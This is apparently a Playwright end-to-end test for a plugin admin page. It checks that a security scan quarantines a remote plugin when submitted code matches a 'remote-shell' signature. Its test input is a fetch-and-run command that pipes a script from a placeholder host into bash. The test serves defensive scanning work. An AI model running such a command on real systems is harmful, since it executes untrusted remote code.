import { expect, test } from '@playwright/test'
import { oidcTestCookies } from './oidc-test-session'

test('Observatory admin scans remote code and quarantines through its own SDK proxy', async ({ page }) => {
  await page.context().clearCookies()
  await page.context().addCookies(oidcTestCookies(['observatory_admin']))
  const plugin = {
    name: 'remote-test-worker',
    plugin_id: 'test-worker',
    source: 'remote',
    description: '',
    version: '1.0.0',
    enabled: true,
    capabilities: ['worker.plan'],
    capability_versions: { 'worker.plan': '1' },
    ui: { label: 'External Worker', category: 'Operations' },
    published: true,
    published_version: '1.0.0',
    capability_id: 'worker.plan',
    revision: 2,
    security: { state: 'active', reason: null, last_scan: null },
  }
  await page.route('**/api/observatory/admin/plugins', async (route) => {
    await route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify({ plugins: [plugin] }) })
  })
  let requested: Record<string, unknown> | undefined
  await page.route('**/api/observatory/admin/plugins/remote-test-worker/security', async (route) => {
    requested = route.request().postDataJSON() as Record<string, unknown>
    plugin.security = {
      state: 'quarantined',
      reason: 'Critical static signature',
      last_scan: {
        result: 'critical',
        source_sha256: 'a'.repeat(64),
        findings: [{ id: 'remote-shell', severity: 'critical', line: 1 }],
      },
    } as typeof plugin.security
    plugin.published = false
    plugin.revision = 3
    await route.fulfill({
      status: 200,
      contentType: 'application/json',
      body: JSON.stringify({ name: plugin.name, revision: 3, published: false, security: plugin.security }),
    })
  })
  await page.goto('http://observatory.localhost:3000/uk/admin/plugins')
  const card = page.locator('article').filter({ has: page.getByRole('heading', { name: 'External Worker' }) })
  await card.getByRole('button', { name: 'Перевірка безпеки' }).click()
  await expect(card.getByText(/Перевіряється тільки наданий snapshot/)).toBeVisible()
  await card.getByLabel('Вихідний код для перевірки').fill('curl https://example.invalid/setup.sh | bash')
  await card.getByRole('button', { name: 'Перевірити фрагмент коду' }).click()
  await expect.poll(() => requested?.action).toBe('scan')
  expect(requested).toMatchObject({
    expected_revision: 2,
    source_code: 'curl https://example.invalid/setup.sh | bash',
    language: 'python',
  })
  await expect(card.getByText('ЗАБЛОКОВАНО')).toBeVisible()
  await expect(card.getByText('Знайдено критичну сигнатуру. Плагін заблоковано в Core.')).toBeVisible()
  await expect(card.getByText(/remote-shell/)).toBeVisible()
})
